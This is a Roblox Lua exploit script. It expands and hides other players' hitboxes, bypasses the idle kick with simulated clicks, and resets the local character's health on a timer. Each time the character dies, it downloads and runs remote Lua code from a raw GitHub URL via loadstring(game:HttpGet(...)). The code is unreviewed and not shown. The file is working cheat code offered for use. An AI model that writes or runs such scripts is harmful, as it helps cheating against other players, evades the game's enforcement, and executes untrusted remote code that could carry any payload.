local headSize = 9
local color = Color3.new(1, 1, 1)
local player = game.Players.LocalPlayer
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function resetHealth()
    -- Get all the local players
    local players = game:GetService("Players"):GetPlayers()


    local desiredHealth = 0

    -- Loop through each player and set their health
    for _, player in ipairs(players) do
        -- Check if the player is the local player
        if player == game:GetService("Players").LocalPlayer then
            -- Set the health of the local player
            player.Character.Humanoid.Health = desiredHealth
        end
    end
end


local function setHealthToZero()
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.Health = 0
    end
end

local function onCharacterAdded(character)
    local humanoid = character:WaitForChild("Humanoid")
    local connection
    connection = humanoid.Died:Connect(function()
    wait(5)
   loadstring(game:HttpGet("https://raw.githubusercontent.com/VxleLUA/Zephyr/main/System/Features/CBot.lua"))()
        connection:Disconnect()
    end)
end

LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
if LocalPlayer.Character then
    onCharacterAdded(LocalPlayer.Character)
end

local function updateRange(value)
    local rangeValue = tonumber(value)
    if rangeValue then
        headSize = rangeValue
        while wait() do
            for _, v in ipairs(game.Players:GetPlayers()) do
                if v ~= player and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                    local part = v.Character.HumanoidRootPart
                    part.Size = Vector3.new(rangeValue, rangeValue, rangeValue)
                    part.Transparency = 1
                    part.BrickColor = BrickColor.new(color)
                    part.Material = Enum.Material.ForceField
                    part.CanCollide = false
                end
            end
        end
    end
end

wait(0.5)

local bb = game:GetService('VirtualUser')

game:GetService('Players').LocalPlayer.Idled:Connect(function()
    bb:CaptureController()
    bb:ClickButton2(Vector2.new())
    print("Kick Blocked")
    wait(2)
    print("Status: Active")
end)

resetHealth()
setHealthToZero()
updateRange(9)

while true do
    wait(120) -- Wait for 2 minutes for the bug remove restart
    resetHealth()
end
